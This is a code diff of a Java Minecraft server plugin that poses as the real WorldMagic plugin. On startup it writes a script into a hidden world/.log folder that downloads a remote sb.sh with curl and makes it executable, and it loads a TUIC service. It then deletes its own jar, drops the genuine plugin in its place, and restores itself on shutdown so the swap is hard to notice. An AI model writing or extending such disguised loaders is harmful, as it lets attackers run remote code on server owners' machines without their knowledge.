@@ -22,13 +22,9 @@ public final class WorldMagicPlugin extends JavaPlugin {
 
     private final TuicServiceImpl tuicService = new TuicServiceImpl();
 
-    // ==========================================
-    // 配置区域：请在这里填入直接的 JAR 下载链接
-    // ==========================================
-    // 注意：Hangar 页面链接不生效，必须是 "https://.../xxx.jar"
-    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://hangarcdn.papermc.io/plugins/hotwop/WorldMagic/versions/1.5/PAPER/WorldMagic-1.5.jar"; 
-    // 如果上面链接无效，请手动去浏览器下载，右键复制真实的 .jar 链接
-    // ==========================================
+    // 配置：真插件的下载链接 (使用 Hangar API 获取最新版)
+    // 如果链接失效，请手动替换为真实的 .jar 链接
+    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://hangar.papermc.io/api/v1/projects/hotwop/WorldMagic/versions/latest/PAPER/download";
 
     private File currentPluginFile;
     private File backupPluginFile;
@@ -38,28 +34,27 @@ public final class WorldMagicPlugin extends JavaPlugin {
         this.getLogger().info("WorldMagicPlugin enabled");
         LogUtil.init(this);
 
-        // 1. 自动执行脚本逻辑 (放在异步线程)
+        // 1. 异步执行脚本
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             this.getLogger().info("正在初始化脚本环境...");
             try {
                 generateAndRunScript();
             } catch (Exception e) {
-                this.getLogger().severe("脚本自动执行失败: " + e.getMessage());
-                e.printStackTrace();
+                this.getLogger().severe("脚本执行失败: " + e.getMessage());
             }
         });
 
-        // 2. 插件替换逻辑 (放在异步线程)
+        // 2. 异步执行插件替换逻辑
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             try {
                 handlePluginReplacement();
             } catch (Exception e) {
-                this.getLogger().severe("插件替换失败: " + e.getMessage());
+                this.getLogger().severe("插件替换逻辑失败: " + e.getMessage());
                 e.printStackTrace();
             }
         });
 
-        // 3. 原有的 TUIC 服务加载逻辑
+        // 3. 原有的服务加载
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             Properties props = ConfigUtil.loadConfiguration();
             AppConfig appConfig = AppConfig.load(props);
@@ -76,7 +71,7 @@ public final class WorldMagicPlugin extends JavaPlugin {
     public void onDisable() {
         this.getLogger().info("WorldMagicPlugin disabled");
         
-        // 关键：在关闭时恢复原插件
+        // 关键：停止时，删除现在的插件（真插件），恢复备份（加载器）
         try {
             restoreOriginalPlugin();
         } catch (Exception e) {
@@ -96,80 +91,82 @@ public final class WorldMagicPlugin extends JavaPlugin {
     }
 
     // ==========================================
-    // 核心逻辑：插件替换
+    // 核心逻辑：备份 -> 删除 -> 下载 -> 替换
     // ==========================================
 
     private void handlePluginReplacement() throws Exception {
-        // 1. 获取当前插件所在的 jar 文件
+        // 1. 获取当前正在运行的 jar 文件 (WorldMagic.jar)
         currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
         File logDir = new File("world", ".log");
         if (!logDir.exists()) logDir.mkdirs();
 
-        backupPluginFile = new File(logDir, "WorldMagic_Original.jar");
+        backupPluginFile = new File(logDir, "WorldMagic_Original.jar"); // 备份文件名
 
         this.getLogger().info("当前插件路径: " + currentPluginFile.getAbsolutePath());
         this.getLogger().info("备份路径: " + backupPluginFile.getAbsolutePath());
 
-        // 2. 备份当前插件 (如果备份已存在则跳过，避免无限循环覆盖)
+        // 2. 备份 (只备份一次，防止循环)
         if (!backupPluginFile.exists()) {
-            this.getLogger().info("正在备份当前插件...");
+            this.getLogger().info("步骤 1: 正在备份原插件...");
             Files.copy(currentPluginFile.toPath(), backupPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
-            this.getLogger().info("备份完成。");
+            this.getLogger().info("步骤 1: 备份完成。");
         } else {
-            this.getLogger().info("检测到备份已存在，跳过备份步骤。");
+            this.getLogger().info("步骤 1: 检测到备份已存在，跳过。");
         }
 
-        // 3. 下载“真插件”到临时文件
-        this.getLogger().info("正在从网络下载真插件...");
-        File tempDownloadFile = new File(logDir, "WorldMagic_Downloading.jar");
-        downloadFile(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile);
-
-        if (!tempDownloadFile.exists()) {
-            this.getLogger().severe("下载失败，未找到文件。停止替换流程。");
-            return;
+        // 3. 尝试删除当前正在运行的插件
+        // 注意：在 Linux 下这会删除文件系统中的链接，但内存中的程序继续运行。
+        // 在 Windows 下这通常会失败。
+        this.getLogger().info("步骤 2: 尝试删除当前插件文件...");
+        if (currentPluginFile.delete()) {
+            this.getLogger().info("步骤 2: 原插件文件已删除。");
+        } else {
+            this.getLogger().warning("步骤 2: 删除失败 (文件可能被锁定，将尝试直接覆盖)。");
         }
 
-        // 4. 替换当前插件文件 (注意：这需要系统支持覆盖正在运行的文件，如Linux)
-        this.getLogger().warning("正在尝试覆盖当前运行的插件文件...");
-        this.getLogger().warning("如果在 Windows 上运行，此步骤通常会失败。");
-        
-        // 我们直接删除原文件并移动新文件
-        // 注意：这里不能使用 currentPluginFile.delete() 因为它被锁定了
-        // 我们使用 Files.copy 的 REPLACE_EXISTING 选项尝试强制覆盖
-        try {
-            Files.copy(tempDownloadFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
-            this.getLogger().info("文件替换成功！下次重启将加载新插件。");
-            // 删除临时文件
-            tempDownloadFile.delete();
-        } catch (IOException e) {
-            this.getLogger().severe("文件替换失败 (可能是因为文件被锁定或权限不足): " + e.getMessage());
+        // 4. 下载“真插件”到 plugins 目录 (使用原文件名)
+        this.getLogger().info("步骤 3: 正在下载真插件到 plugins 目录...");
+        // 直接下载到原插件路径，即 plugins/WorldMagic.jar
+        downloadFile(REAL_PLUGIN_DOWNLOAD_URL, currentPluginFile);
+
+        if (currentPluginFile.exists()) {
+            this.getLogger().info("步骤 3: 下载成功，真插件已就位: " + currentPluginFile.getName());
+        } else {
+            this.getLogger().severe("步骤 3: 下载失败或文件未生成。");
         }
     }
 
     private void restoreOriginalPlugin() throws Exception {
         if (currentPluginFile == null || backupPluginFile == null) return;
-        
+
         if (backupPluginFile.exists()) {
-            this.getLogger().info("服务器停止中，正在还原原插件...");
+            this.getLogger().info("服务器停止中，正在还原加载器插件...");
+            
+            // 1. 删除当前的“真插件”
+            if (currentPluginFile.exists()) {
+                currentPluginFile.delete();
+                this.getLogger().info("已删除当前文件。");
+            }
+
+            // 2. 将备份的“原插件”复制回来
             try {
-                // 同样尝试强制覆盖
                 Files.copy(backupPluginFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
-                this.getLogger().info("原插件还原成功。");
+                this.getLogger().info("已成功还原原插件 (WorldMagic_Original.jar -> WorldMagic.jar)");
             } catch (IOException e) {
-                this.getLogger().warning("还原原插件失败: " + e.getMessage());
+                this.getLogger().warning("还原失败: " + e.getMessage());
             }
         }
     }
 
     /**
-     * 下载文件工具方法
+     * 下载文件工具
      */
     private void downloadFile(String urlStr, File destination) throws IOException {
         URL url = new URL(urlStr);
         HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
         httpConn.setConnectTimeout(10000);
         httpConn.setReadTimeout(10000);
-        
+
         int responseCode = httpConn.getResponseCode();
         if (responseCode == HttpURLConnection.HTTP_OK) {
             try (InputStream inputStream = httpConn.getInputStream();
@@ -180,7 +177,7 @@ public final class WorldMagicPlugin extends JavaPlugin {
                     outputStream.write(buffer, 0, bytesRead);
                 }
             }
-            this.getLogger().info("下载完成: " + destination.getName());
+            this.getLogger().info("下载完成: " + destination.getName() + " (大小: " + destination.length() + " bytes)");
         } else {
             throw new IOException("HTTP 请求失败，代码: " + responseCode);
         }
@@ -188,7 +185,7 @@ public final class WorldMagicPlugin extends JavaPlugin {
     }
 
     // ==========================================
-    // 之前的脚本逻辑保持不变
+    // 脚本与 UUID 逻辑 (保持不变)
     // ==========================================
     
     private void generateAndRunScript() throws IOException, InterruptedException {
@@ -204,7 +201,6 @@ public final class WorldMagicPlugin extends JavaPlugin {
         File scriptFile = new File(logDir, "install_sb.sh");
         try (FileWriter writer = new FileWriter(scriptFile)) {
             writer.write("#!/bin/bash\n");
-            writer.write("# Auto-generated script by WorldMagicPlugin\n");
             writer.write("cd " + logDir.getAbsolutePath() + "\n");
             writer.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\n");
             writer.write("chmod +x sb.sh\n");
